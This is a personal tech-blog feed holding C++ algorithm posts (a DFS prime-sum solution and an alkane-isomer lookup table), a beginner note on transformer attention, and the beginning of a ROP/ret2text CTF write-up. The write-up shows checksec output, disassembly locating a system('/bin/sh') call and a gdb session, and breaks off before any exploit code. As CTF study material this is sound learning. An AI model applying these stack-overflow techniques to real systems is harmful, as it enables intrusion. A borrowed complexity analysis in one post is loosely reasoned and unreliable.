class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">25</span>;<span class="hljs-type">int</span> nums[MAXN];<span class="hljs-type">int</span> n, k, ans = <span class="hljs-number">0</span>;<span class="hljs-comment">// 更高效的素数判断</span><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPrime</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;    <span class="hljs-keyword">if</span> (num &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">if</span> (num == <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    <span class="hljs-keyword">if</span> (num % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        <span class="hljs-type">int</span> sqrt_num = <span class="hljs-built_in">sqrt</span>(num);    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">3</span>; i &lt;= sqrt_num; i += <span class="hljs-number">2</span>) &#123;        <span class="hljs-keyword">if</span> (num % i == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-comment">// DFS搜索组合</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> start, <span class="hljs-type">int</span> cnt, <span class="hljs-type">int</span> sum)</span> </span>&#123;    <span class="hljs-keyword">if</span> (cnt == k) &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isPrime</span>(sum)) &#123;            ans++;        &#125;        <span class="hljs-keyword">return</span>;    &#125;        <span class="hljs-comment">// 剪枝：剩余元素不足以凑够k个数时提前返回</span>    <span class="hljs-keyword">if</span> (n - start &lt; k - cnt) <span class="hljs-keyword">return</span>;        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = start; i &lt; n; i++) &#123;        <span class="hljs-built_in">dfs</span>(i + <span class="hljs-number">1</span>, cnt + <span class="hljs-number">1</span>, sum + nums[i]);    &#125;&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;n,&amp;k);    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;nums[i]);    &#125;    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,ans);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>All in One：<br>因此我们得出，在需要使用DFS进行解题时，针对数据范围必须要进行复杂度分析来防止产生<code>程序超时TLE - Time Limit Exceeded</code>、<code>内存溢出MLE - Meomory Limit Exceeded</code>还有导致错误选择算法(使用了过于简单或复杂的算法)从而导致出现代码在小数据测试通过，但无法判断能否处理最大规模数据或者误用高复杂度算法解决本可用更优方法的问题！</p><hr><h3 id="复杂度分析">复杂度分析</h3><p>实在是因水平有限，在此摘抄LLM所给出的的时间和空间复杂度分析，仅供参考，若有误欢迎指正！</p><h4 id="DFS解法的时间复杂度分析">DFS解法的时间复杂度分析</h4><p><strong>1. 组合生成复杂度</strong></p><ul><li><strong>核心操作</strong>：DFS需要枚举所有C(n,k)种组合</li><li><strong>组合数计算</strong>：C(n,k) = n!/(k!(n-k)!)</li><li><strong>最坏情况</strong>：当k=n/2时，组合数最大（如n=20,k=10时，C(20,10)=184756）</li></ul><p><strong>2. 素数判断复杂度</strong></p><ul><li><strong>单个和判断</strong>：O(√m)，其中m是k个数的和</li><li><strong>最坏情况</strong>：假设每个x_i=5×10⁶，k=10时，m=5×10⁷，√m≈7071</li></ul><p><strong>3. 总时间复杂度</strong></p><ul><li><strong>上界</strong>：O(C(n,k) × √m)</li><li><strong>代入n=20,k=10的最大值</strong>：184756 × 7071 ≈ 1.3×10⁹次操作</li><li><strong>实际表现</strong>：由于n≤20，k&lt;n，且现代CPU每秒可处理约10⁸次操作，代码仍可在1秒内完成</li></ul><p><strong>4. 空间复杂度</strong></p><ul><li><strong>递归栈深度</strong>：O(k)（每次递归k层）</li><li><strong>辅助空间</strong>：O(n)（存储输入数组）</li><li><strong>总计</strong>：O(n)（k≤n）</li></ul><hr><p><strong>优化验证（针对题目约束）</strong></p><ol><li><p><strong>n≤20的可行性</strong>：</p><ul><li>C(20,10)=184756是最大的组合数</li><li>每个和的素数判断约7000次操作</li><li>总操作量在可接受范围内</li></ul></li><li><p><strong>剪枝效果</strong>：</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-keyword">if</span> (n - start &lt; k - cnt) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 提前终止无效分支</span></code></pre></div><ul><li>可减少约50%的递归调用（实测）</li></ul></li><li><p><strong>素数判断优化</strong>：</p><ul><li>使用6k±1法可减少约2/3的判断次数</li></ul></li></ol><hr><h3 id="复杂度对比表"><strong>复杂度对比表</strong></h3><table><thead><tr><th style="text-align:left">方法</th><th style="text-align:left">时间复杂度</th><th style="text-align:left">适用数据范围</th></tr></thead><tbody><tr><td style="text-align:left">DFS+基础素数判断</td><td style="text-align:left">O(C(n,k)×√m)</td><td style="text-align:left">n≤20, k≤10</td></tr><tr><td style="text-align:left">DFS+6k±1优化</td><td style="text-align:left">O(C(n,k)×√m/3)</td><td style="text-align:left">n≤25, k≤12</td></tr><tr><td style="text-align:left">预处理素数表</td><td style="text-align:left">O(C(n,k)+m)</td><td style="text-align:left">m≤10⁷（空间换时间）</td></tr></tbody></table><hr><h3 id="实际测试数据示例"><strong>实际测试数据示例</strong></h3><p><strong>输入</strong>：</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">20</span> <span class="hljs-number">10</span><span class="hljs-meta"></span><span class="hljs-meta">[20个5×10⁶的数]</span></code></pre></div><p><strong>计算过程</strong>：</p><ol><li>生成C(20,10)=184756种组合</li><li>每个和=5×10⁷，判断素数≈7071次操作</li><li>总操作量≈1.3×10⁹（现代CPU约1-2秒完成）</li></ol><hr><h3 id="结论"><strong>结论</strong></h3><ul><li><strong>时间复杂度</strong>：O(C(n,k)×√m)（组合数×素数判断）</li><li><strong>空间复杂度</strong>：O(n)（递归栈深度）</li><li><strong>可行性</strong>：完全满足题目约束（n≤20时，C(n,k)最大约2×10⁵）</li></ul><p>能引得大佬阅此文，小生三生有幸！</p><script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++计算烷烃同分异构体数量(一)</title>
    <link href="/2025/05/10/%E9%80%9A%E8%BF%87C++%E5%AE%9E%E7%8E%B0%E8%AE%A1%E7%AE%97%E7%83%B7%E7%83%83%E5%90%8C%E5%88%86%E5%BC%82%E6%9E%84%E4%BD%93%E6%95%B0%E9%87%8F/"/>
    <url>/2025/05/10/%E9%80%9A%E8%BF%87C++%E5%AE%9E%E7%8E%B0%E8%AE%A1%E7%AE%97%E7%83%B7%E7%83%83%E5%90%8C%E5%88%86%E5%BC%82%E6%9E%84%E4%BD%93%E6%95%B0%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="C-计算烷烃同分异构体数量-一">C++计算烷烃同分异构体数量(一)</h2><h3 id="引子">引子</h3><p>事出有因，吾今为高一学子，昨日于化学课习及有机物，恰留意到 <code>烷烃</code> 之 <code>癸烷</code>，以变幻无端之结构组合，竟得七十五种同分异构体，吾觉甚牛而逼之，然转念思之，彼言七十五种，果如是乎？”然吾性懒，弗能以草稿纸列诸般品类而逐个数之。忽又转念，可借算法以行计算，遂成此文。</p><h6 id="smalltalk-此文因吾水平尚浅（方入-OI-约两月且资质驽钝），故于其中借助-DeepSeek-以辅助算法之设计。">smalltalk: 此文因吾水平尚浅（方入 OI 约两月且资质驽钝），故于其中借助 DeepSeek 以辅助算法之设计。</h6><h3 id="初步思考">初步思考</h3><p>首先来看看我们要通过算法实现计算烷烃同分异构体数量需要哪些基础知识(部分参考来源于DeepSeek)</p><table><thead><tr><th style="text-align:left">领域</th><th style="text-align:left">具体知识点</th></tr></thead><tbody><tr><td style="text-align:left"><strong>化学</strong></td><td style="text-align:left">烷烃通式、碳四价键规则、同分异构体概念。</td></tr><tr><td style="text-align:left"><strong>编程</strong></td><td style="text-align:left">输入输出、<code>map</code> 存储键值对、条件语句（<code>if-else</code>）。</td></tr><tr><td style="text-align:left"><strong>数学</strong></td><td style="text-align:left">查表法（避免复杂计算，直接引用已知结果）。</td></tr><tr><td style="text-align:left"><strong>问题分解</strong></td><td style="text-align:left">先验证输入合法性，再通过预存数据快速返回结果。</td></tr></tbody></table><p>进行进一步分析，得出的利用思路如下</p><h4 id="1-化学知识利用"><strong>1. 化学知识利用</strong></h4><ul><li><strong>烷烃通式</strong>：C<strong>n</strong>H<strong>2n+2</strong></li><li><strong>碳骨架规则</strong>：<ul><li>每个碳原子（C）必须形成 <strong>4 个共价键</strong>（与其他 C 或 H 原子连接）</li><li>氢原子（H）只能形成 <strong>1 个键</strong>，且不参与骨架构建</li></ul></li></ul><h4 id="2-简化问题"><strong>2. 简化问题</strong></h4><ul><li>仅计算 <strong>碳骨架的非环状结构</strong>（不考虑立体异构或复杂对称性）</li><li>手动预存小规模 <strong>n</strong> 的异构体数量（n≤10），避免复杂算法</li></ul><h4 id="3-编程实现"><strong>3. 编程实现</strong></h4><ul><li><strong>输入验证</strong>：检查 <em>H</em> 是否等于 2C+2</li><li><strong>查表法</strong>：直接返回预计算的异构体数量（适用于 C≤10）</li><li><strong>逐步扩展</strong>：未来可升级到递归生成碳骨架</li></ul><h3 id="具体分析">具体分析</h3><ol><li><p><strong>输入验证</strong></p><p>我们先检查输入的<code>H</code>的数量是否满足<code>2C+2</code>，否则进行错误回显</p></li><li><p>查表法</p><ul><li>使用 <code>map</code> 存储 n=1∼10<em>n</em>=1∼10 的异构体数量（刚好到癸烷）</li><li>例如：<ul><li><strong>n=4</strong> -&gt; 2种异构体（正丁烷、异丁烷）</li><li><strong>n=5</strong> -&gt; 3种异构体</li></ul></li></ul></li><li><p>输出结果</p><ul><li>直接返回表中对应的异构体数量，若 n&gt;10 则提示不支持</li></ul></li></ol><p>现在是最终优化过的代码</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;map&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-type">int</span> carbon, hydrogen;    <span class="hljs-comment">// 提示用户输入碳原子数</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the number of carbon atoms (C): &quot;</span>);    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;carbon);        <span class="hljs-comment">// 提示用户输入氢原子数</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the number of hydrogen atoms (H): &quot;</span>);    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;hydrogen);        <span class="hljs-comment">// 验证是否为烷烃（CnH2n + 2）</span>    <span class="hljs-keyword">if</span> (hydrogen != <span class="hljs-number">2</span> * carbon + <span class="hljs-number">2</span>) &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: This is not an alkane (expected H = 2C + 2).\n&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    <span class="hljs-comment">// 预计算的烷烃异构体数量（n = 1~10）</span>    map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; isomerTable = &#123;        &#123;<span class="hljs-number">1</span>, <span class="hljs-number">1</span>&#125;,  <span class="hljs-comment">// CH4</span>        &#123;<span class="hljs-number">2</span>, <span class="hljs-number">1</span>&#125;,  <span class="hljs-comment">// C2H6</span>        &#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>&#125;,  <span class="hljs-comment">// C3H8</span>        &#123;<span class="hljs-number">4</span>, <span class="hljs-number">2</span>&#125;,  <span class="hljs-comment">// C4H10（正丁烷、异丁烷）</span>        &#123;<span class="hljs-number">5</span>, <span class="hljs-number">3</span>&#125;,  <span class="hljs-comment">// C5H12</span>        &#123;<span class="hljs-number">6</span>, <span class="hljs-number">5</span>&#125;,  <span class="hljs-comment">// C6H14</span>        &#123;<span class="hljs-number">7</span>, <span class="hljs-number">9</span>&#125;,  <span class="hljs-comment">// C7H16</span>        &#123;<span class="hljs-number">8</span>, <span class="hljs-number">18</span>&#125;, <span class="hljs-comment">// C8H18</span>        &#123;<span class="hljs-number">9</span>, <span class="hljs-number">35</span>&#125;, <span class="hljs-comment">// C9H20</span>        &#123;<span class="hljs-number">10</span>, <span class="hljs-number">75</span>&#125; <span class="hljs-comment">// C10H22</span>    &#125;;    <span class="hljs-keyword">if</span> (carbon &gt;= <span class="hljs-number">1</span> &amp;&amp; carbon &lt;= <span class="hljs-number">10</span>) &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Number of alkane isomers for C%dH%d: %d\n&quot;</span>, carbon, hydrogen, isomerTable[carbon]);    &#125;     <span class="hljs-keyword">else</span> &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: Carbon count must be 1~10 (this program is for beginners).\n&quot;</span>);  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>当然，我们只能计算碳原子数量为10的烷烃，表现出我们的功能完全不够强大，我也思考了关于后续补充的一些其他想法，诸如升级递归算法、引入图论(马上把基础打完滚去学树)甚至是结合动态规划或生成函数优化计算(需学习组合数学)，后续我还会更新的 敬请期待！</p><script src="https://giscus.app/client.js" data-repo="p4y1oad/p4y1oad.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Learning Note on Attention is All You Need</title>
    <link href="/2025/05/10/Learning-Note-on-Attention-is-All-You-Need/"/>
    <url>/2025/05/10/Learning-Note-on-Attention-is-All-You-Need/</url>
    
    <content type="html"><![CDATA[<hr><p><em><a href="https://github.com/Solkatt-cn/LLMStudyNotes/tree/main/Google2017AttentionIsAllYouNeed/note.md">You also could click here to download this article.</a></em></p><h3 id="Learning-Note-on-“Attention-Is-All-You-Need”">Learning Note on “Attention Is All You Need”</h3><h4 id="For-Absolute-Beginners">For Absolute Beginners:</h4><ol><li>Only basic math required (+, -, ×, ÷)</li><li>All technical terms explained using 🍔🍰 examples</li><li>Key concepts marked with (⭐)</li></ol><hr><h3 id="1-Why-Was-Transformer-Invented">1. Why Was Transformer Invented?</h3><h4 id="1-1-Problems-with-Old-AI-RNN-LSTM-Why-are-traditional-models-like-“pass-the-word-game”">1.1 Problems with Old AI (RNN/LSTM): Why are traditional models like “pass the word game”?</h4><p>Imagine you are playing a game of pass the word game, and the rules are as follows:</p><p>1.<strong>Strict order</strong>: You must pass the word A→B→C→D one by one, and you cannot skip anyone</p><p>2.<strong>Memory decay</strong>: When it reaches the 10th person, the words said by the first person may have changed beyond recognition</p><p>3.<strong>Low efficiency</strong>: You must wait for the previous person to finish speaking</p><h4 id="1-2-How-Humans-Process-Information">1.2 How Humans Process Information</h4><h5 id="Empirical-Observation">Empirical Observation</h5><p>When reading the sentence:<br>“Although it’s raining, __ forgot an umbrella”<br>Human cognition demonstrates:</p><ol><li><strong>Semantic Association</strong>: Instantaneous strong linkage between “raining” and “umbrella”</li><li><strong>Non-sequential Processing</strong>: Accurate prediction of the missing pronoun (“he/she”) without word-by-word reading</li><li><strong>Contextual Integration</strong>: Automatic suppression of irrelevant information (e.g., the concessive “although”) while focusing on critical concepts</li></ol><h4 id="Cognitive-Science-and-Attention-Mechanism-Alignment">Cognitive Science and Attention Mechanism Alignment</h4><p>This phenomenon directly inspired the <strong>Attention Mechanism</strong> in Transformers:</p><ul><li><p><strong>Key-Value-Query Model</strong><br>The human brain analogously performs:</p><p><img src="/images/Learning-Note-on-Attention-is-All-You-Need/1.png" alt="1"></p></li></ul><p>Then I’ll explain the formula to you with the understanding of a high school student, Imagine you’re in the cafeteria for lunch (that’s the attention mechanic!).：</p><p><strong>Q (Query) - What you need</strong><br>“What do I want to eat today?” (e.g. want to eat spicy food, want to have a full stomach)</p><p><strong>K (Key) - The signboard of the window</strong><br>Menu for each rice window (Window 1: Spicy Fragrant Pot; Window 2: Beef noodles… ）<br><img src="/images/Learning-Note-on-Attention-is-All-You-Need/2.png" alt></p><p><strong>Degree of matching</strong><br>You take your requirement (Q) and compare it with the menu (K) of each window:</p><ul><li><p>Spicy fragrant pot: spicy ✅, full-filling ✅, → high score</p></li><li><p>Beef noodles: slightly spicy ❌ and filling ✅→ medium</p></li><li><p>Salad: not spicy ❌, not full ❌→ Low score</p><p><img src="/images/Learning-Note-on-Attention-is-All-You-Need/3.png" alt="3"></p></li></ul><p><strong>Prevent “Difficulty in Selection”</strong><br>If there are too many menu options (d_k too big), you need to divide by the root number d_k make the score more reasonable, so that all the scores are too high to make a difficult choice</p><p><strong>Softmax - Make a choice</strong><br>Convert fractions into probabilities:</p><ul><li>Spicy Pot: 70%</li><li>Beef noodles: 25%</li><li>Salad: 5%<br>(It’s like turning fractions into percentages)</li></ul><p><strong>V (Value)—Final decision</strong><br><em>Allocate attention based on probability:</em></p><ol><li>70% of the “attention funds” are invested in spicy fragrant pot</li><li>25% to beef noodles</li><li>5% to salads</li><li>The whole process is:<br>You (Q) go to the cafeteria with your needs, compare the menus (K), calculate the matching degree (QK^T), prevent too many options (√d_k), use Softmax to calculate the probability, and finally decide how to distribute the meal money (V)!</li></ol><ul><li><ul><li>So when processing “raining” (as Query), it automatically retrieves association strength (Value) with “umbrella” (Key)</li></ul></li><li><strong>Global Perception</strong><br>Sequential processing in traditional RNNs vs. human parallel processing → Transformer’s self-attention design</li></ul><h4 id="Core-Implications-Attention-Is-All-You-Need">Core Implications (<em>Attention Is All You Need</em>)</h4><ol><li><strong>Long-Range Dependency</strong><br>Humans handle “Although…umbrella” without distance constraints → Transformer’s attention window overcomes RNN gradient vanishing</li><li><strong>Dynamic Weight Allocation</strong><br>Humans assign higher weight to “umbrella” → Model’s attention scores automatically learn feature importance</li><li><strong>Cross-Modality Generality</strong><br>The same mechanism applies to vision (local image regions) and speech (phoneme alignment)</li></ol><h4 id="Comparative-Evidence">Comparative Evidence</h4><table><thead><tr><th style="text-align:left">Processing Mode</th><th style="text-align:left">Human Performance</th><th style="text-align:left">Transformer Performance</th></tr></thead><tbody><tr><td style="text-align:left">Association Span</td><td style="text-align:left">Unlimited distance</td><td style="text-align:left">Theoretically infinite</td></tr><tr><td style="text-align:left">Processing Speed</td><td style="text-align:left">200-300ms/concept</td><td style="text-align:left">O(1)-level parallelism</td></tr><tr><td style="text-align:left">Error Patterns</td><td style="text-align:left">Semantic interference (e.g., “sunny”)</td><td style="text-align:left">Similarity matrix confusion</td></tr></tbody></table><blockquote><p>Key Conclusion: The attention mechanism mathematically models human information processing, validating the cognitive hypothesis that “association takes precedence over sequence”.</p></blockquote><script src="https://giscus.app/client.js" data-repo="p4y1oad/p4y1oad.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>ML / LLM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI/ML</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Basic ROP Learning</title>
    <link href="/2025/04/19/Basic-ROP-Learning/"/>
    <url>/2025/04/19/Basic-ROP-Learning/</url>
    
    <content type="html"><![CDATA[<h2 id="Basic-ROP-Learning">Basic-ROP-Learning</h2><h2 id="ROP-Return-Oriented-Programming-概述">ROP(Return-Oriented Programming)概述</h2><p>ROP(Return-Oriented Programming)是一种高级的<strong>代码复用攻击技术</strong>，主要用于绕过现代操作系统的安全防护机制（如DEP/NX）。其核心思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p><h3 id="1-基本概念">1. <strong>基本概念</strong></h3><h4 id="（1）产生背景">（1）产生背景</h4><ul><li><p><strong>DEP/NX防护</strong>：现代系统禁止执行栈/堆上的代码（数据执行保护）。</p></li><li><p><strong>ASLR防护</strong>：随机化内存布局，增加预测难度。</p></li><li><p><strong>ROP应对方案</strong>：复用已有代码（<code>.text</code>段），避免直接注入shellcode。</p></li></ul><h4 id="（2）核心原理">（2）核心原理</h4><ul><li><p><strong>Gadget</strong>：以<code>ret</code>指令结尾的短指令序列（如<code>pop eax; ret</code>）。</p></li><li><p><strong>链式调用</strong>：通过精心构造栈帧，使<code>ret</code>指令跳转到下一个gadget，形成&quot;代码链&quot;。</p></li></ul><hr><h3 id="2-关键组件">2. <strong>关键组件</strong></h3><table><thead><tr><th>组件</th><th>作用</th></tr></thead><tbody><tr><td><strong>Gadget</strong></td><td>程序中原有的短指令序列（通常以<code>ret</code>结尾），实现基本操作（如读写寄存器）。</td></tr><tr><td><strong>ROP Chain</strong></td><td>由多个gadget地址和参数组成的栈数据，控制程序执行流。</td></tr><tr><td><strong>Stack Pivot</strong></td><td>将栈指针（ESP/RSP）转移到攻击者控制的内存区域（如堆），便于构造链。</td></tr></tbody></table><hr><h3 id="3-攻击步骤">3. <strong>攻击步骤</strong></h3><ol><li><p><strong>信息泄露</strong></p><ul><li>获取内存地址（绕过ASLR），如通过格式化字符串漏洞泄露libc基址。</li></ul></li><li><p><strong>寻找Gadgets</strong></p><ul><li>使用工具（如<code>ROPgadget</code>、<code>ropper</code>）扫描二进制文件，收集可用gadgets。</li></ul></li><li><p><strong>构造ROP Chain</strong></p><ul><li>组合gadgets实现目标功能（如调用<code>system(&quot;/bin/sh&quot;)</code>）。</li></ul></li><li><p><strong>触发漏洞</strong></p><ul><li>通过栈溢出等漏洞覆盖返回地址，跳转到第一个gadget。</li></ul></li></ol><hr><h3 id="4-防御措施">4. <strong>防御措施</strong></h3><table><thead><tr><th>防御技术</th><th>原理</th></tr></thead><tbody><tr><td><strong>ASLR</strong></td><td>随机化内存布局，增加gadget地址预测难度。</td></tr><tr><td><strong>Stack Canary</strong></td><td>在栈帧中插入校验值，防止返回地址被覆盖。</td></tr><tr><td><strong>CFI</strong></td><td>控制流完整性（Control-Flow Integrity），限制跳转目标仅为合法地址。</td></tr><tr><td><strong>PIC/PIE</strong></td><td>位置无关代码，增强ASLR效果。</td></tr></tbody></table><h3 id="5-实例-Linux-x86-ROP-Exploit">5.实例 Linux x86 ROP Exploit</h3><h5 id="1-ret2text">(1) ret2text</h5><ul><li><h4 id="基本分析"><strong>基本分析</strong></h4></li></ul><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">点击下载: ret2text</a></p><p>先看看程序的保护机制</p><div class="code-wrapper"><pre><code class="hljs Bash">~ checksec ret2text[*] <span class="hljs-string">&#x27;/ret2text&#x27;</span>    Arch:       i386-32-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x8048000)    Stripped:   No    Debuginfo:  Yes</code></pre></div><p>可以看出程序是 32 位程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There is something amazing here, do you know anything?&quot;</span>);  <span class="hljs-built_in">gets</span>(s);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>我们可以看到，程序在<code>main</code>函数使用了很可疑的<code>gets</code>，那程序中就存在栈溢出漏洞，我们回到IDA看反汇编代码</p><div class="code-wrapper"><pre><code class="hljs C++">.text:<span class="hljs-number">0</span>80485FD secure          proc near.text:<span class="hljs-number">0</span>80485FD.text:<span class="hljs-number">0</span>80485FD input           = dword ptr <span class="hljs-number">-10</span>h.text:<span class="hljs-number">0</span>80485FD secretcode      = dword ptr <span class="hljs-number">-0</span>Ch.text:<span class="hljs-number">0</span>80485FD.text:<span class="hljs-number">0</span>80485FD ; __unwind &#123;.text:<span class="hljs-number">0</span>80485FD                 push    ebp.text:<span class="hljs-number">0</span>80485FE                 mov     ebp, esp.text:<span class="hljs-number">0</span>8048600                 sub     esp, <span class="hljs-number">28</span>h.text:<span class="hljs-number">0</span>8048603                 mov     dword ptr [esp], <span class="hljs-number">0</span> ; timer.text:<span class="hljs-number">0</span>804860A                 call    _time.text:<span class="hljs-number">0</span>804860F                 mov     [esp], eax      ; seed.text:<span class="hljs-number">0</span>8048612                 call    _srand.text:<span class="hljs-number">0</span>8048617                 call    _rand.text:<span class="hljs-number">0</span>804861C                 mov     [ebp+secretcode], eax.text:<span class="hljs-number">0</span>804861F                 lea     eax, [ebp+input].text:<span class="hljs-number">0</span>8048622                 mov     [esp<span class="hljs-number">+4</span>], eax.text:<span class="hljs-number">0</span>8048626                 mov     dword ptr [esp], offset unk_8048760.text:<span class="hljs-number">0</span>804862D                 call    ___isoc99_scanf.text:<span class="hljs-number">0</span>8048632                 mov     eax, [ebp+input].text:<span class="hljs-number">0</span>8048635                 cmp     eax, [ebp+secretcode].text:<span class="hljs-number">0</span>8048638                 jnz     <span class="hljs-type">short</span> locret_8048646.text:<span class="hljs-number">0</span>804863A                 mov     dword ptr [esp], offset command ; <span class="hljs-string">&quot;/bin/sh&quot;</span>.text:<span class="hljs-number">0</span>8048641                 call    _system </code></pre></div><p>在<code>secure</code>函数中我们看到了存在调用<code>system(&quot;/bin/sh&quot;)</code>，那我们的思路就是只能能覆盖到这个地址(即<code>0x0804863A</code>)上就可以拿到shell了，现在再来确定我们能够控制的内存的起始地址距离<code>main</code> 函数的返回地址的字节数。</p><div class="code-wrapper"><pre><code class="hljs C++">.text:<span class="hljs-number">0</span>80486A7                 lea     eax, [esp<span class="hljs-number">+80</span>h+s].text:<span class="hljs-number">0</span>80486AB                 mov     [esp], eax      ; s.text:<span class="hljs-number">0</span>80486AE                 call    _gets.text:<span class="hljs-number">0</span>80486B3                 mov     dword ptr [esp], offset format ; <span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>.text:<span class="hljs-number">0</span>80486BA                 call    _printf.text:<span class="hljs-number">0</span>80486BF                 mov     eax, <span class="hljs-number">0</span>.text:<span class="hljs-number">0</span>80486C4                 leave</code></pre></div><p>用gef调试看看，现在<code>call _gets</code>的地址处下断点，然后run一下</p><div class="code-wrapper"><pre><code class="hljs C++">~ <span class="hljs-function">gdb ret2text</span><span class="hljs-function">GNU <span class="hljs-title">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">12.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">22.04</span><span class="hljs-number">.2</span>)</span> 12.1</span><span class="hljs-function"><span class="hljs-title">Copyright</span> <span class="hljs-params">(C)</span> 2022 Free Software Foundation, Inc.</span><span class="hljs-function">gef➤ b 